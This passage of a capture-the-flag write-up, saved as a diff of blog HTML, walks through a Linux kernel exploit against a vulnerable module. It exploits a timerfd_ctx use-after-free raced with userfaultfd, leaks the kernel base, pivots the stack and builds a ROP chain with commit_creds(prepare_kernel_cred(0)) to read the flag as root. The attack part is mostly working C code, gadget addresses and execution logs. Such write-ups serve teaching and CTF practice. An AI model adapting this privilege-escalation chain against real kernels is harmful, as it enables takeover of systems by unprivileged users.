+    <span class="k">if</span> <span class="p">((</span><span class="n">pollfd</span><span class="p">.</span><span class="n">revents</span> <span class="o">&amp;</span> <span class="n">POLLERR</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="n">pollfd</span><span class="p">.</span><span class="n">revents</span> <span class="o">&amp;</span> <span class="n">POLLHUP</span><span class="p">))</span>
+    <span class="p">{</span>
+      <span class="n">perror</span><span class="p">(</span><span class="s">"[ERROR] Polling failed"</span><span class="p">);</span>
+      <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">ufd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fault_msg</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">fault_msg</span><span class="p">))</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">fault_msg</span><span class="p">))</span>
+    <span class="p">{</span>
+      <span class="n">perror</span><span class="p">(</span><span class="s">"[ERROR] Read - fault_msg failed"</span><span class="p">);</span>
+      <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="kt">char</span> <span class="o">*</span><span class="n">page_fault_location</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">fault_msg</span><span class="p">.</span><span class="n">arg</span><span class="p">.</span><span class="n">pagefault</span><span class="p">.</span><span class="n">address</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">fault_msg</span><span class="p">.</span><span class="n">event</span> <span class="o">!=</span> <span class="n">UFFD_EVENT_PAGEFAULT</span> <span class="o">||</span> <span class="p">(</span><span class="n">page_fault_location</span> <span class="o">!=</span> <span class="n">page</span> <span class="o">&amp;&amp;</span> <span class="n">page_fault_location</span> <span class="o">!=</span> <span class="n">page</span> <span class="o">+</span> <span class="n">PAGE_SIZE</span><span class="p">))</span>
+    <span class="p">{</span>
+      <span class="n">perror</span><span class="p">(</span><span class="s">"[ERROR] Unexpected pagefault?"</span><span class="p">);</span>
+      <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">page_fault_location</span> <span class="o">==</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xdead000</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Page fault at address %p!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">page_fault_location</span><span class="p">);</span>
+
+      <span class="n">puts</span><span class="p">(</span><span class="s">"[*] Freeing..."</span><span class="p">);</span>
+      <span class="n">do_free</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+
+      <span class="n">puts</span><span class="p">(</span><span class="s">"[*] Creating second timer..."</span><span class="p">);</span>
+      <span class="n">create_timer</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+
+      <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">buff</span><span class="p">))[</span><span class="mh">0x3</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x000000000eae0e65</span><span class="p">;</span>
+      <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">buff</span><span class="p">))[</span><span class="mh">0x4</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x000000000eae0e65</span><span class="p">;</span>
+      <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">buff</span><span class="p">))[</span><span class="mh">0x5</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4141414141414141</span><span class="p">;</span> <span class="c1">// [1]
+</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s">"[*] Structure will be overwritten with: "</span><span class="p">);</span>
+      <span class="n">hexdump</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+
+      <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">.</span><span class="mi">8</span><span class="p">);</span>
+
+      <span class="n">ufd_copy</span><span class="p">.</span><span class="n">dst</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="mh">0xdead000</span><span class="p">;</span>
+      <span class="n">ufd_copy</span><span class="p">.</span><span class="n">src</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">buff</span><span class="p">);</span>
+      <span class="n">ufd_copy</span><span class="p">.</span><span class="n">len</span> <span class="o">=</span> <span class="n">PAGE_SIZE</span><span class="p">;</span>
+      <span class="n">ufd_copy</span><span class="p">.</span><span class="n">mode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+      <span class="n">ufd_copy</span><span class="p">.</span><span class="n">copy</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+      <span class="k">if</span> <span class="p">(</span><span class="n">ioctl</span><span class="p">(</span><span class="n">ufd</span><span class="p">,</span> <span class="n">UFFDIO_COPY</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ufd_copy</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+      <span class="p">{</span>
+        <span class="n">perror</span><span class="p">(</span><span class="s">"ioctl(UFFDIO_COPY)"</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+      <span class="p">}</span>
+
+      <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>As we can see from <strong>[1]</strong>, with this first POC we should be able to overwrite the kernel RIP with a bounch of “A”s.
+Finally we can write our main function:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">pthread_t</span> <span class="n">tid</span><span class="p">;</span>
+
+  <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">DEVICE_PATH</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+
+  <span class="n">puts</span><span class="p">(</span><span class="s">"[*] Allocating/Freeing timerfd_ctx structure..."</span><span class="p">);</span>
+  <span class="n">create_timer</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+
+  <span class="n">puts</span><span class="p">(</span><span class="s">"[*] Leaking timerfd_tmrproc address..."</span><span class="p">);</span>
+  <span class="n">do_alloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
+  <span class="n">do_show</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+
+  <span class="n">puts</span><span class="p">(</span><span class="s">"[+] Object dump: "</span><span class="p">);</span>
+  <span class="n">hexdump</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+
+  <span class="n">leak</span> <span class="o">=</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">buff</span><span class="p">))[</span><span class="mh">0x5</span><span class="p">];</span>
+  <span class="n">timerfd_ctx</span> <span class="o">=</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">buff</span><span class="p">))[</span><span class="mi">0</span><span class="p">];</span>
+  <span class="n">kernel_base</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="mh">0x81102a00UL</span> <span class="o">+</span> <span class="mh">0x100000000UL</span><span class="p">;</span>
+
+  <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Leaked timerfd_ctx structure address: 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">timerfd_ctx</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Leaked timerfd_tmrproc address: 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">leak</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Kernel base address: 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="mh">0xffffffff00000000UL</span> <span class="o">+</span> <span class="n">kernel_base</span><span class="p">));</span>
+
+  <span class="kt">int</span> <span class="n">ufd</span> <span class="o">=</span> <span class="n">initialize_ufd</span><span class="p">();</span>
+  <span class="n">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">tid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">page_fault_handler</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ufd</span><span class="p">);</span>
+
+  <span class="n">puts</span><span class="p">(</span><span class="s">"[*] Triggering page fault..."</span><span class="p">);</span>
+  <span class="n">do_edit</span><span class="p">(</span><span class="n">page</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+
+  <span class="n">pthread_join</span><span class="p">(</span><span class="n">tid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+<span class="p">}</span></code></pre></figure>
+
+<p>Here’s the complete POC code: <a href="assets/files/hotrod/poc.c">poc.c</a></p>
+
+<p>We can compile the code using:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">gcc</span> <span class="o">-</span><span class="n">o</span> <span class="n">poc</span> <span class="n">poc</span><span class="p">.</span><span class="n">c</span> <span class="o">-</span><span class="k">static</span> <span class="o">-</span><span class="n">s</span> <span class="o">-</span><span class="n">lpthread</span></code></pre></figure>
+
+<p>then we can copy the exploit in the qemu instance and execute it:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>          / $ /home/user/poc
+          [*] Allocating/Freeing timerfd_ctx structure...
+          [*] Leaking timerfd_tmrproc address...
+          [+] Object dump:
+            0000  0xffff88800029bf00    0x0000000000000000      
+            0010  0x0000000000000000    0x00000002e3f48042      
+            0020  0x00000002e3f48042    0xffffffff81102a00      
+            0030  0xffffffff8183e080    0x0000000000000000      
+            0040  0x0000000000000000    0x0000000000000000      
+            0050  0x0000000000000000    0x0000000000000000      
+            0060  0x0000000000000000    0x0000000000000000      
+            0070  0x0000000000000000    0x0000000000000000      
+            0080  0xbd7dd3bf6c2aa381    0xffff88800029bf88      
+            0090  0xffff88800029bf88    0x0000000000000000      
+            00a0  0x0000000000000000    0xffff88800015ad00      
+            00b0  0x00000000000000a8    0x0000000000000000      
+            00c0  0x0000000000000000    0x0000000000000000      
+            00d0  0x0000000000000000    0x0000000000000000      
+            00e0  0x0000000000000000    0x0000000000000000    
+          [+] Leaked timerfd_ctx structure address: 0xffff88800029bf00
+          [+] Leaked timerfd_tmrproc address: 0xffffffff81102a00
+          [+] Kernel base address: 0xfffffffd00000000
+          [*] Mmapping page...
+          [*] Start monitoring range: 0xdead000 - 0xdeae000
+          [*] Triggering page fault...
+          [+] Page fault at address 0xdead000!
+          [*] Freeing...
+          [*] Creating second timer...
+          [*] Structure will be overwritten with:
+            0000  0xffff88800029b900    0x0000000000000000      
+            0010  0x0000000000000000    0x000000000eae0e65      
+            0020  0x000000000eae0e65    0x4141414141414141 &lt;- timerfd_tmrproc [1]      
+            0030  0xffffffff8183e080    0x0000000000000000      
+            0040  0x0000000000000000    0x0000000000000000      
+            0050  0x0000000000000000    0x0000000000000000      
+            0060  0x0000000000000000    0x0000000000000000      
+            0070  0x0000000000000000    0x0000000000000000      
+            0080  0xbd7bd3bf6c2aa481    0xffff88800029b988      
+            0090  0xffff88800029b988    0x0000000000000000      
+            00a0  0x0000000000000000    0xffff88800013f800      
+            00b0  0x00000000000000a8    0x0000000000000000      
+            00c0  0x0000000000000000    0x0000000000000000      
+            00d0  0x0000000000000000    0x0000000000000000      
+            00e0  0x0000000000000000    0x0000000000000000    
+          general protection fault: 0000 [#1] PTI
+          CPU: 0 PID: 66 Comm: exploit Tainted: G           O      5.8.3 #12          
+          RIP: 0010:0x4141414141414141 // [2]
+          Code: Bad RIP value.
+          RSP: 0018:ffffc90000003f18 EFLAGS: 00000006
+          [...]
+
+</code></pre></div></div>
+
+<p>Bingo! As expected, overwriting timerfd_tmrproc in the timerfd_ctx structure <strong>[1]</strong> we can control the kernel instruction pointer! <strong>[2]</strong>
+Now we need to create a ROP-chain, perform stack pivoting and start executing gadgets!</p>
+
+<p>Using gdb we can start debugging the kernel of the qemu instance. We are interested in the CPU context when timerfd_tmrproc is called. Let’s comment the following line in our poc:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">buff</span><span class="p">))[</span><span class="mh">0x5</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x4141414141414141</span><span class="p">;</span></code></pre></figure>
+
+<p>Now we can attach gdb to the kernel and set a brakpoint to timerfd_tmrproc.</p>
+
+<p>When the timer expires, timerfd_tmrproc is executed.
+As we can see, the RDI contains <code class="highlighter-rouge">0xffff88800029bc00</code>, the address of the timerfd_ctx structure in memory.
+The first field of the structure, is the address of the structure itself:</p>
+
+<p><img src="/assets/images/hotrod/context.png" alt="context" class="img-responsive" /></p>
+
+<p>In red, we can see the address of the structure itself, in green the timerfd_tmrproc:</p>
+
+<p><img src="/assets/images/hotrod/timerfd_ctx.png" alt="context" class="img-responsive" /></p>
+
+<p>Since the RDI is pointing to the timerfd_ctx structure, and we can control the first field, we can map a memory region to use as fake stack:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="o">*</span><span class="n">fake_stack</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xcafe000</span><span class="p">,</span> <span class="n">PAGE_SIZE</span><span class="o">*</span><span class="mi">5</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_FIXED</span><span class="o">|</span><span class="n">MAP_ANONYMOUS</span><span class="o">|</span><span class="n">MAP_POPULATE</span><span class="o">|</span><span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span></code></pre></figure>
+
+<p>and use <code class="highlighter-rouge">0xcafe000</code> as first field. Then we can perform stack pivoting, overwriting the timerfd_tmrproc pointer with a gadget like:</p>
+
+<p><code class="highlighter-rouge">0xffffffff81027b86: mov esp, dword ptr [rdi]; lea rax, [rax + rsi*8]; ret;</code></p>
+
+<p>We can make the following changes in the <strong>page_fault_handler()</strong> function:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="p">[...]</span>
+<span class="kt">void</span> <span class="o">*</span><span class="n">fake_stack</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xcafe000</span><span class="p">,</span> <span class="n">PAGE_SIZE</span><span class="o">*</span><span class="mi">5</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_FIXED</span><span class="o">|</span><span class="n">MAP_ANONYMOUS</span><span class="o">|</span><span class="n">MAP_POPULATE</span><span class="o">|</span><span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+<span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">buff</span><span class="p">))[</span><span class="mh">0x0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)(</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x800</span><span class="p">);</span>
+<span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">buff</span><span class="p">))[</span><span class="mh">0x3</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x000000000eae0e65</span><span class="p">;</span>
+<span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">buff</span><span class="p">))[</span><span class="mh">0x4</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x000000000eae0e65</span><span class="p">;</span>
+<span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">buff</span><span class="p">))[</span><span class="mh">0x5</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)(</span><span class="n">pivot</span><span class="p">);</span>
+
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">rop</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x800</span><span class="p">);</span>
+
+<span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="mh">0x4242424242424242</span><span class="p">;</span>
+<span class="p">[...]</span></code></pre></figure>
+
+<p>Here’s the code of the second POC after applying the aforementioned changes: <a href="/assets/files/hotrod/poc2.c">poc2.c</a>. Let’s execute the exploit again:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>            / $ /home/user/poc
+            [*] Allocating/Freeing timerfd_ctx structure...
+            [*] Leaking timerfd_tmrproc address...
+            [+] Object dump:
+              0000  0xffff88800029b600    0x0000000000000000      
+              0010  0x0000000000000000    0x00000002f21b349d      
+              0020  0x00000002f21b349d    0xffffffff81102a00      
+              0030  0xffffffff8183e080    0x0000000000000000      
+              0040  0x0000000000000000    0x0000000000000000      
+              0050  0x0000000000000000    0x0000000000000000      
+              0060  0x0000000000000000    0x0000000000000000      
+              0070  0x0000000000000000    0x0000000000000000      
+              0080  0xbd74d3bf6c2aab81    0xffff88800029b688      
+              0090  0xffff88800029b688    0x0000000000000000      
+              00a0  0x0000000000000000    0xffff88800013f000      
+              00b0  0x00000000000000a8    0x0000000000000000      
+              00c0  0x0000000000000000    0x0000000000000000      
+              00d0  0x0000000000000000    0x0000000000000000      
+              00e0  0x0000000000000000    0x0000000000000000    
+            [+] Leaked timerfd_ctx structure address: 0xffff88800029b600
+            [+] Leaked timerfd_tmrproc address: 0xffffffff81102a00
+            [+] Kernel base address: 0xffffffff00000000
+            [*] Mmapping page...
+            [*] Start monitoring range: 0xdead000 - 0xdeae000
+            [*] Triggering page fault...
+            [+] Page fault at address 0xdead000!
+            [*] Freeing...
+            [*] Creating second timer...
+            [*] Structure will be overwritten with:
+              0000  0x000000000cafe800    0x0000000000000000      
+              0010  0x0000000000000000    0x000000000eae0e65      
+              0020  0x000000000eae0e65    0xffffffff81027b86      
+              0030  0xffffffff8183e080    0x0000000000000000      
+              0040  0x0000000000000000    0x0000000000000000      
+              0050  0x0000000000000000    0x0000000000000000      
+              0060  0x0000000000000000    0x0000000000000000      
+              0070  0x0000000000000000    0x0000000000000000      
+              0080  0xbd70d3bf6c2aaa81    0xffff88800029b288      
+              0090  0xffff88800029b288    0x0000000000000000      
+              00a0  0x0000000000000000    0xffff88800013fb00      
+              00b0  0x00000000000000a8    0x0000000000000000      
+              00c0  0x0000000000000000    0x0000000000000000      
+              00d0  0x0000000000000000    0x0000000000000000      
+              00e0  0x0000000000000000    0x0000000000000000    
+            general protection fault: 0000 [#1] PTI
+            CPU: 0 PID: 66 Comm: exploit Tainted: G           O      5.8.3 #12
+            RIP: 0010:0x4242424242424242 // [1]
+            Code: Bad RIP value.
+            RSP: 0018:000000000cafe808 EFLAGS: 00000006 // [2]
+            [...]
+</code></pre></div></div>
+
+<p>Success! After stack pivoting, we overwritten the RIP with a bounch of “B”s <strong>[1]</strong>, and the RSP now contains <code class="highlighter-rouge">0xcafe808</code> <strong>[2]</strong>. It’s time to build our ROP-chain!</p>
+
+<h3 id="the-exploit---from-bs-to-root-shell">The exploit - From “B”s to root shell</h3>
+<p>As a first attempt, let’s try to read the flag. To do so, we can start our ROP-chain with <code class="highlighter-rouge">commit_creds(prepare_kernel_cred(0)</code>. In Linux every task has its own <a href="https://elixir.bootlin.com/linux/v5.8.3/source/include/linux/cred.h#L111">cred structure</a>, it speficies the security context of the task. <a href="https://elixir.bootlin.com/linux/v5.8.3/source/kernel/cred.c#L682">prepare_kernel_cred</a> will allocate a new <code class="highlighter-rouge">cred structure</code> with uid, gid etc. set to 0. <a href="https://elixir.bootlin.com/linux/v5.8.3/source/kernel/cred.c#L437">commit_creds</a> will apply it to the current task. In this way we will be able to get root privileges.</p>
+
+<p>Then we need to change the 12th flag of the CR3 register (remember that <strong>KPTI</strong> is enabled), use <code class="highlighter-rouge">swapgs</code> to swap GS back to the user GS, saved in an MSR and then use <code class="highlighter-rouge">iretq</code> to return to user space. We can do it in different ways. For example we can use the symbol <code class="highlighter-rouge">swapgs_restore_regs_and_return_to_usermode</code>. Using GDB we can see that <code class="highlighter-rouge">swapgs_restore_regs_and_return_to_usermode + 0x35</code> is a perfect gadget for us:</p>
+
+<p><img src="/assets/images/hotrod/trampoline.png" alt="trampoline" /></p>
+
+<p>We can find similar instructions when the system returns in user space after a syscall:</p>
+
+<p><img src="/assets/images/hotrod/trampoline2.png" alt="trampoline2" /></p>
+
+<p>The only difference is that the first gadget uses <code class="highlighter-rouge">iretq</code>, the second one <code class="highlighter-rouge">sysretq</code>:</p>
+
+<ul>
+  <li><code class="highlighter-rouge">iretq</code> expects the following stack layout when returning in user space:</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+            +-------------------+
+            |        RIP        |
+            +-------------------+
+            |        CS         |
+            +-------------------+
+            |       RFLAGS      |           
+            +-------------------+
+            |        RSP        |
+            +-------------------+
+            |        SS         |
+            +-------------------+
+
+</code></pre></div></div>
+
+<ul>
+  <li><code class="highlighter-rouge">sysretq</code> accepts user space RIP from RCX and RFLAGS from R11.</li>
+</ul>
+
+<p>We can save the current processor state using:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kt">void</span> <span class="nf">save_state</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">__asm__</span> <span class="n">__volatile__</span><span class="p">(</span>
+    <span class="s">"movq %0, cs;"</span>
+    <span class="s">"movq %1, ss;"</span>
+    <span class="s">"pushfq;"</span>
+    <span class="s">"popq %2;"</span>
+    <span class="o">:</span> <span class="s">"=r"</span> <span class="p">(</span><span class="n">usr_cs</span><span class="p">),</span> <span class="s">"=r"</span> <span class="p">(</span><span class="n">usr_ss</span><span class="p">),</span> <span class="s">"=r"</span> <span class="p">(</span><span class="n">usr_rflags</span><span class="p">)</span> <span class="o">:</span> <span class="o">:</span> <span class="s">"memory"</span> <span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>And we can read the flag using:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">read_flag</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">flag</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+  <span class="n">read</span><span class="p">(</span><span class="n">open</span><span class="p">(</span><span class="s">"/flag"</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">),</span> <span class="n">flag</span><span class="p">,</span> <span class="mi">100</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="n">flag</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>If we use the second gadget, our ROP-chain will be:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xffffffff810b689dUL</span><span class="p">;</span> <span class="c1">// pop rdi; ret;
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xffffffff81053680UL</span><span class="p">;</span> <span class="c1">// pkc
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xffffffff8108bacaUL</span><span class="p">;</span> <span class="c1">// mov rdi, rax; call 0x2d1350; mov rax, -9; pop rbp; ret;
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xffffffff810537d0UL</span><span class="p">;</span> <span class="c1">// cc
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xffffffff8118a8d3UL</span><span class="p">;</span> <span class="c1">// pop rcx; ret;
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)(</span><span class="n">read_flag</span><span class="p">);</span>
+<span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xffffffff81008b7dUL</span><span class="p">;</span> <span class="c1">// pop r11; pop r12; pop rbp; ret;
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="n">usr_rflags</span><span class="p">;</span>
+<span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// r12
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// rbp
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0xffffffff81200106UL</span><span class="p">;</span> <span class="c1">// kpti_trampoline (sysret)
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// rax
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// rdi
+</span><span class="o">*</span><span class="n">rop</span> <span class="o">++=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)(</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x1000</span><span class="p">);</span> <span class="o">//</span> <span class="n">rsp</span></code></pre></figure>
+
+<p>Here’s the third poc: <a href="/assets/files/hotrod/poc3.c">poc3.c</a>, let’s compile it and execute it:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>            / $ /home/user/poc3
+            [*] Allocating/Freeing timerfd_ctx structure...
+            [*] Leaking timerfd_tmrproc address...
+            [+] Object dump:
+              0000  0xffff88800029b800    0x0000000000000000      
+              0010  0x0000000000000000    0x00000002de088cb1      
+              0020  0x00000002de088cb1    0xffffffff81102a00      
+              0030  0xffffffff8183e080    0x0000000000000000      
+              0040  0x0000000000000000    0x0000000000000000      
+              0050  0x0000000000000000    0x0000000000000000      
+              0060  0x0000000000000000    0x0000000000000000      
+              0070  0x0000000000000000    0x0000000000000000      
+              0080  0xbd7ad3bf6c2aae81    0xffff88800029b888      
+              0090  0xffff88800029b888    0x0000000000000000      
+              00a0  0x0000000000000000    0xffff888000157600      
+              00b0  0x00000000000000a8    0x0000000000000000      
+              00c0  0x0000000000000000    0x0000000000000000      
+              00d0  0x0000000000000000    0x0000000000000000      
+              00e0  0x0000000000000000    0x0000000000000000    
+            [+] Leaked timerfd_ctx structure address: 0xffff88800029b800            
+            [+] Leaked timerfd_tmrproc address: 0xffffffff81102a00
+            [+] Kernel base address: 0xffffffff00000000
+            [*] Mmapping page...
+            [*] Start monitoring range: 0xdead000 - 0xdeae000
+            [*] Triggering page fault...
+            [+] Page fault at address 0xdead000!
+            [*] Freeing...
+            [*] Creating second timer...
+            [*] Structure will be overwritten with:
+              0000  0x000000000cafe800    0x0000000000000000      
+              0010  0x0000000000000000    0x000000000eae0e65      
+              0020  0x000000000eae0e65    0xffffffff81027b86      
+              0030  0xffffffff8183e080    0x0000000000000000      
+              0040  0x0000000000000000    0x0000000000000000      
+              0050  0x0000000000000000    0x0000000000000000      
+              0060  0x0000000000000000    0x0000000000000000      
+              0070  0x0000000000000000    0x0000000000000000      
+              0080  0xbd7ad3bf6c2aae81    0xffff88800029b888      
+              0090  0xffff88800029b888    0x0000000000000000      
+              00a0  0x0000000000000000    0xffff888000157600      
+              00b0  0x00000000000000a8    0x0000000000000000      
+              00c0  0x0000000000000000    0x0000000000000000      
+              00d0  0x0000000000000000    0x0000000000000000      
+              00e0  0x0000000000000000    0x0000000000000000    
+            CUCTF{TEST}
+
+            BUG: unable to handle page fault for address: 00000001034cc473
+            #PF: supervisor instruction fetch in kernel mode
+            [...]
+</code></pre></div></div>
+<p>The kernel crashed, but we successfully read the flag <strong>[1]</strong>! Cool, but it’s not enough. We want a shell.</p>
+
